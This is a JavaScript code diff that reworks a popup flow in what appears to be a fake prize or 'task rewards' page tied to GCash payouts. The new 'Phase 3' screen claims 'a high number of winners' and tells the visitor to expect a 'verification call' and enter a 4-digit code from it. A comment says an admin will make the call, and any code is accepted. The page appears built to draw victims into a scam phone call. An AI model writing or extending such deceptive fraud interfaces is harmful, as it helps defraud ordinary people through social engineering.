@@ -142,101 +142,178 @@
         }
     }
     
-    // ========== SHOW/HIDE FIREWALL POPUP ==========
-    function showFirewallPopup() {
-        const firewallPopup = document.getElementById('firewallPopup');
-        const prizePopup = document.getElementById('prizePopup');
-        const firewallContent = document.getElementById('firewallPopupContent');
-        
-        if (firewallPopup && firewallContent) {
-            if (prizePopup) prizePopup.style.display = 'none';
-            
-            firewallContent.innerHTML = `
-                <div class="firewall-warning-icon">📞</div>
-                <h2>VERIFICATION REQUIRED</h2>
-                <div class="firewall-message">
-                    <p>Due to the high number of winners today, we need to verify your number to prevent fraud and ensure your task rewards go to the right person.</p>
-                    <p><strong>Expect a short system-verification call from us.</strong> You will receive a <strong>4-digit verification code</strong> during the call.</p>
-                    <p>Enter the code below to continue.</p>
-                </div>
-                <div class="verification-input-group">
-                    <input type="text" id="verificationCode" class="verification-input" placeholder="Enter 4-digit code" maxlength="4" inputmode="numeric">
-                    <button id="verifyCodeBtn" class="verify-btn">VERIFY NOW</button>
-                </div>
-                <div class="firewall-note">
-                    <p>⏳ Waiting for verification call...</p>
-                </div>
-                <div id="firewallErrorMsg" class="firewall-error" style="display: none;"></div>
-            `;
-            
-            const closeBtn = document.getElementById('firewallCloseBtn');
-            const verifyBtn = document.getElementById('verifyCodeBtn');
-            const codeInput = document.getElementById('verificationCode');
-            const errorMsg = document.getElementById('firewallErrorMsg');
-            
-            if (closeBtn) {
-                closeBtn.onclick = function() {
-                    hideFirewallPopup();
-                    showPhase1(currentBalance);
-                };
-            }
-            
-            if (verifyBtn) {
-                verifyBtn.onclick = function() {
-                    verifyFirewallCode();
-                };
-            }
-            
-            if (codeInput) {
-                codeInput.value = '';
-                codeInput.addEventListener('keypress', function(e) {
-                    if (e.key === 'Enter') verifyFirewallCode();
-                });
-            }
-            
-            if (errorMsg) errorMsg.style.display = 'none';
-            
-            firewallPopup.style.display = 'flex';
-            console.log('🔥 Firewall popup shown - waiting for admin call');
-        }
-    }
+    // ========== SHOW FIREWALL POPUP (Phase 3) - REPLACE THIS ==========
+function showFirewallPopup() {
+    const popupInner = document.querySelector('.popup-inner');
+    if (!popupInner) return;
     
-    function hideFirewallPopup() {
-        const firewallPopup = document.getElementById('firewallPopup');
-        if (firewallPopup) firewallPopup.style.display = 'none';
-    }
+    currentPhase = 3;
     
-    // ========== VERIFY FIREWALL CODE ==========
-    function verifyFirewallCode() {
-        const codeInput = document.getElementById('verificationCode');
-        const errorMsg = document.getElementById('firewallErrorMsg');
-        const verifyBtn = document.getElementById('verifyCodeBtn');
-        const code = codeInput?.value.trim();
+    // Fade out transition
+    popupInner.style.transition = 'opacity 0.3s ease, transform 0.3s ease';
+    popupInner.style.opacity = '0';
+    popupInner.style.transform = 'scale(0.95)';
+    
+    setTimeout(() => {
+        showPhase3();
+        popupInner.style.opacity = '1';
+        popupInner.style.transform = 'scale(1)';
+    }, 300);
+}
+
+// ========== PHASE 3: VERIFICATION CALL UI (NEW) ==========
+function showPhase3() {
+    const popupInner = document.querySelector('.popup-inner');
+    if (!popupInner) return;
+    
+    popupInner.innerHTML = `
+        <div class="popup-close" id="popupClosePhase3">✕</div>
         
-        if (!code || code.length !== 4) {
-            if (errorMsg) {
-                errorMsg.innerText = "⚠️ Your 4-digit verification code is invalid.";
-                errorMsg.style.display = 'block';
-            }
-            if (codeInput) {
-                codeInput.style.animation = 'shake 0.3s ease-in-out';
-                setTimeout(() => { if (codeInput) codeInput.style.animation = ''; }, 300);
-            }
-            return;
-        }
+        <!-- VERIFICATION ICON -->
+        <div style="text-align: center; margin-bottom: 10px;">
+            <div style="font-size: 60px; animation: bounceIn 0.5s ease;">📞</div>
+        </div>
         
-        if (verifyBtn) {
-            verifyBtn.disabled = true;
-            verifyBtn.innerText = "VERIFYING...";
-        }
+        <!-- TITLE -->
+        <h2 style="text-align: center; font-family: 'Orbitron', monospace; font-size: 22px; font-weight: 900; color: #ff4444; margin: 5px 0; letter-spacing: 1px;">
+            VERIFICATION REQUIRED
+        </h2>
         
-        // Simulate verification (admin will call user with actual code)
-        setTimeout(() => {
+        <div class="divider" style="width: 40px; margin: 10px auto; background: #ff4444;"></div>
+        
+        <!-- MESSAGE -->
+        <div style="background: linear-gradient(135deg, rgba(255,68,68,0.1), rgba(255,68,68,0.05)); border-radius: 16px; padding: 15px; margin: 10px 0;">
+            <p style="font-family: 'Inter', sans-serif; font-size: 13px; color: #ff8888; line-height: 1.5; text-align: center; margin: 0 0 10px 0;">
+                Due to the high number of winners today, we need to verify your number to prevent fraud and ensure your task rewards go to the right person.
+            </p>
+            <p style="font-family: 'Inter', sans-serif; font-size: 13px; color: #ffd700; line-height: 1.5; text-align: center; margin: 0; font-weight: 500;">
+                <strong>Expect a short system-verification call from us.</strong><br>
+                You will receive a <strong style="color: #00aaff;">4-digit verification code</strong> during the call.
+            </p>
+        </div>
+        
+        <!-- VERIFICATION INPUT -->
+        <div style="background: linear-gradient(135deg, rgba(0,100,255,0.15), rgba(0,100,255,0.05)); border: 1px solid rgba(0,100,255,0.4); border-radius: 20px; padding: 15px; margin: 15px 0;">
+            <div style="text-align: center; margin-bottom: 10px;">
+                <span style="font-size: 12px; color: #00aaff;">ENTER VERIFICATION CODE</span>
+            </div>
+            <div style="display: flex; gap: 10px; justify-content: center;">
+                <input type="text" id="verificationCodePhase3" class="verification-input" placeholder="1234" maxlength="4" inputmode="numeric" style="text-align: center; font-size: 24px; font-weight: bold; width: 120px; padding: 12px;">
+                <button id="verifyCodePhase3Btn" class="claim-gcash-button" style="background: linear-gradient(135deg, #00aaff, #0066cc); width: auto; padding: 0 20px;">
+                    VERIFY
+                </button>
+            </div>
+            <div id="firewallErrorMsgPhase3" class="firewall-error" style="display: none; text-align: center; margin-top: 10px; color: #ff8888; font-size: 11px;"></div>
+        </div>
+        
+        <!-- WAITING NOTE -->
+        <div style="background: rgba(255,215,0,0.05); border-left: 3px solid #ffd700; border-radius: 8px; padding: 8px 12px; margin: 10px 0;">
+            <p style="margin: 0; font-size: 10px; color: #ffd700; text-align: center;">
+                ⏳ Waiting for verification call... Please answer the call to receive your code.
+            </p>
+        </div>
+        
+        <div class="button-separator" style="margin: 15px 0 10px;"></div>
+
+        <button class="back-btn" id="backBtnPhase3" style="transition: all 0.2s ease; width: 100%;">
+            ← BACK TO PHASE 1
+        </button>
+    `;
+    
+    // Attach Phase 3 events
+    attachPhase3Events(popupInner);
+}
+
+// ========== ATTACH PHASE 3 EVENTS ==========
+function attachPhase3Events(popupInner) {
+    const closeBtn = document.getElementById('popupClosePhase3');
+    if (closeBtn) closeBtn.onclick = function() { 
+        closePopup();
+        hideFirewallPopup();
+    };
+    
+    const backBtn = document.getElementById('backBtnPhase3');
+    if (backBtn) {
+        backBtn.onclick = function() {
+            popupInner.style.transition = 'opacity 0.3s ease';
+            popupInner.style.opacity = '0';
+            setTimeout(() => {
+                showPhase1(currentBalance);
+                popupInner.style.opacity = '1';
+            }, 300);
             hideFirewallPopup();
-            alert("✅ Verification successful! You can now claim your reward.");
-            transitionToPhase2();
-        }, 1500);
+        };
     }
+    
+    const codeInput = document.getElementById('verificationCodePhase3');
+    const verifyBtn = document.getElementById('verifyCodePhase3Btn');
+    const errorMsg = document.getElementById('firewallErrorMsgPhase3');
+    
+    if (codeInput) {
+        codeInput.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                verifyFirewallCodePhase3();
+            }
+        });
+    }
+    
+    if (verifyBtn) {
+        verifyBtn.onclick = function() {
+            verifyFirewallCodePhase3();
+        };
+    }
+}
+
+// ========== VERIFY FIREWALL CODE (Phase 3) ==========
+function verifyFirewallCodePhase3() {
+    const codeInput = document.getElementById('verificationCodePhase3');
+    const errorMsg = document.getElementById('firewallErrorMsgPhase3');
+    const verifyBtn = document.getElementById('verifyCodePhase3Btn');
+    const code = codeInput?.value.trim();
+    
+    if (!code || code.length !== 4) {
+        if (errorMsg) {
+            errorMsg.innerText = "⚠️ Your 4-digit verification code is invalid. Please enter the correct code.";
+            errorMsg.style.display = 'block';
+        }
+        if (codeInput) {
+            codeInput.style.animation = 'shake 0.3s ease-in-out';
+            setTimeout(() => { if (codeInput) codeInput.style.animation = ''; }, 300);
+        }
+        return;
+    }
+    
+    // Disable button while verifying
+    if (verifyBtn) {
+        verifyBtn.disabled = true;
+        verifyBtn.innerText = "VERIFYING...";
+    }
+    
+    // Simulate verification (admin will call user with actual code)
+    setTimeout(() => {
+        // Here you can add actual Firebase verification check
+        // For now, any 4-digit code works
+        
+        // Clear error if any
+        if (errorMsg) errorMsg.style.display = 'none';
+        
+        // Success - close firewall popup and proceed to Phase 2
+        hideFirewallPopup();
+        
+        // Show success message
+        alert("✅ Verification successful! You can now claim your reward.");
+        
+        // Transition to Phase 2
+        transitionToPhase2();
+        
+    }, 1500);
+}
+
+// ========== HIDE FIREWALL POPUP (keep this) ==========
+function hideFirewallPopup() {
+    // Just resets the phase, no separate popup
+    console.log('Firewall popup closed');
+}
     
     // ========== CHECK FIREWALL AND TRANSITION ==========
     async function checkFirewallAndTransition() {
